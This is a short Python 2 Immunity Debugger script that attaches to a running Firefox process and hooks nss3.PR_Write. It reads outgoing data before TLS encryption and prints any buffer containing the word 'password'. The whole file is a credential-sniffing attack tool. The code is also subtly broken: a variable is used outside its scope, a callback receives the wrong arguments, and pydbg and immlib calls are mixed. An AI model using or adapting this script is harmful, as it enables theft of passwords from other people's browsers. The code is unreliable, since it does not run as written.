#!/usr/bin/env python 

#from pydbg import *
#from pydbg.defines import *
#import utils

import immlib
import sys

# This is our entry hook callback function
def ssl_sniff( dbg, args ):
    # Now we read out the memory pointed to by the second argument
    # it is stored as an ASCII string, so we'll loop on a read until
    # we reach a NULL byte
    buffer  = ""
    offset  = 0
    while 1:
        byte = dbg.readMemory( args[1] + offset, 1 ) # read_process_memory
        if byte != "\x00":
            buffer  += byte
            offset  += 1
            continue
        else:
            break
    if pattern in buffer:
        print "Pre-Encrypted: %s" % buffer
    return 65538
   
def main(args):
    dbg = immlib.Debugger()
    found_firefox = False
    #Set a pattern that we can make the hook to search for
    pattern = "password"
    # Quick and dirty process enumeration to find firefox.exe

    for (pid, name, path, services, tcp, udp) in dbg.ps():
        if name.lower() == "firefox":
            found_firefox = True
            dbg.Attach(pid)
            hooks = dbg.listHooks() #utils.hook_container()
            print "[*] Attaching to firefox.exe with PID: %d" % pid
            #dbg.getAllModules()
            #dbg.run()
            print "[*] Hooks set, continuing process."
            # Resolve the function address (Just before encryption)
            hook_address  = dbg.getAddress("nss3.PR_Write") # ("nss3.PR_Write")dbg.func_resolve_debuggee("nspr4.dll","PR_Write")

            if hook_address:
                # Add the hook to the container. We aren't interested
                # in using an exit callback, so we set it to None.
                dbg.run()
                dbg.setLoggingBreakpoint(hook_address)
                ssl_sniff(dbg, hook_address)
                #methodCallHook.Add( dbg, hook_address, 2, ssl_sniff, None )
                #methodCallHook.Add( dbg, hook_address, 2, ssl_sniff, None )
                print "[*] nspr4.PR_Write hooked at: 0x%08x" % hook_address
                break
            else:
                print "[*] Error: Couldn't resolve hook address."
                sys.exit(-1)

    else:    
        print "[*] Error: Couldn't find the firefox.exe process."
        sys.exit(-1)

    return ""